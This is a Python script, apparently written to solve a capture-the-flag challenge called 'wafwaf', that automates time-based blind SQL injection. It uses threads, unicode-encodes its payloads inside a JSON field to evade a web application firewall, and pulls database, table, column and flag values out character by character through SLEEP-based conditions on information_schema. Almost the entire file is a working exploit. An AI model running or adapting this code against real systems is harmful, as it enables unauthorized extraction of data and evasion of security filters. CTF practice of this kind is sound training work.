# coded by d4rkstat1c
import requests
from time import time, sleep
from string import printable
from threading import Thread

TARGET = 'http://<wafwaf_IP>:<PORT>/'

# Adjust below globals according to your connection to the CTF server
MAX_THREADS = 10
PAYLOAD_SLEEP = 7
SCRIPT_SLEEP = 0.5

def ascii_gen(ascii_hex):
    if ascii_hex:
        return [num for num in range(32, (128))]
    else:
        return printable[:-6]

def unicode_encode(payload):
    result = ''
    for i in range(len(payload)):
        result += '\\u%.4X' % ord(payload[i])
    return result

# Wrapper function to execute __send_payload method as a thread
def threaded(method):
    def wrapper(*args):
        t = Thread(target=method, args=args)
        t.setDaemon(True)
        t.start()
        return t
    return wrapper

class time_bsqli:
    def __init__(self):
        # Payload template the first argument passed to self.inject will be nested within this payload
        self.payload_template = "x' AND (SELECT 1 FROM (SELECT((IF( {condition} ,SLEEP({PAYLOAD_SLEEP}),0))))x) AND 'x'='x"
        self.exfil_data = {}
        self.thrds = []

    def __check_resp(self, resp_time, pos, ch):
        # Response time is dependent on connectivity 
        if resp_time >= PAYLOAD_SLEEP:
            if type(ch) == int:
                ch = chr(ch) 
            print("Character found:", ch)
            self.exfil_data[pos] = ch

    @threaded
    def __send_payload(self, condition_template, ch, pos):
        # Format payload to add arbitrary values
        condition = condition_template.format(ch=ch, pos=pos)
        payload = self.payload_template.format(condition=condition, PAYLOAD_SLEEP=PAYLOAD_SLEEP)

        # Unicode encode payload to bypass WAF
        enc_payload = unicode_encode(payload)

        # Generate JSON payload
        json_payload = '{"user": "'+enc_payload+'"}'

        # Time check
        start_time = time()
        r = requests.post(TARGET, data=json_payload)
        resp_time = int((time() - start_time))
        self.__check_resp(resp_time, pos, ch)

    def __join_thrds(self):
        for thrd in self.thrds:
            thrd.join()
        self.thrds.clear()

    def __sort_data(self):
        data = dict(sorted(self.exfil_data.items())).values()
        self.exfil_data = {}
        return ''.join(list(data))

    # Worker generator function for creating jobs
    def inject(self, condition_template, data_len, ascii_hex=False):
        ascii_chars = ascii_gen(ascii_hex)
        for pos in range(1, data_len+1): # 1-data_len+1 due to substr() starting at 1th index
            for ch in ascii_chars:
                self.thrds.append(self.__send_payload(condition_template, ch, pos))
                while len(self.thrds) == MAX_THREADS:
                    for thrd in self.thrds:
                        if not thrd.is_alive():
                            self.thrds.remove(thrd)
                    sleep(SCRIPT_SLEEP)
                if pos in self.exfil_data.keys():
                    break
                sleep(SCRIPT_SLEEP)
        self.__join_thrds()
        return self.__sort_data()

def main():
    s = time_bsqli()
    # # Exfiltrate database containing flag table and flag column
    # db_payload = "( SELECT substr(table_schema, {pos}, 1) FROM information_schema.tables WHERE table_schema LIKE '%db%' AND table_name LIKE '%flag%' LIMIT 1 ) = '{ch}'"
    # db = s.inject(db_payload, 8)
    # print('db exfiltrated:', db)
    
    # # Exfiltrate flag table from previously discovered databases
    # table_payload = "( SELECT substr(table_name, {pos}, 1) FROM information_schema.tables WHERE table_schema = '"+db+"' AND table_name LIKE '%flag%' LIMIT 1 ) = '{ch}'"
    # table = s.inject(table_payload, 21)
    # print('table exfiltrated:', table)
    
    # # Exfiltrate flag column from previously discovered table
    # column_payload = "( SELECT substr(column_name, {pos}, 1) FROM information_schema.columns WHERE table_schema = '"+db+"' AND table_name = '"+table+"' AND column_name LIKE '%flag%' LIMIT 1 ) = '{ch}'"
    # column = s.inject(column_payload, 4)
    # print('column exfiltrated:', column)

    # # Exfiltrate flag row from previously discovered column
    # flag_payload = "( SELECT ASCII(substr("+column+", {pos}, 1)) FROM "+db+"."+table+" ) = '{ch}'"
    # flag = s.inject(flag_payload, 33, True)
    # print('flag exfiltrated:', flag)

    flag_payload = "( SELECT ASCII(substr(flag, {pos}, 1)) FROM db_m8452.definitely_not_a_flag ) = '{ch}'"
    flag = s.inject(flag_payload, 33, True)
    print('flag exfiltrated:', flag)

if __name__ == '__main__':
    main()
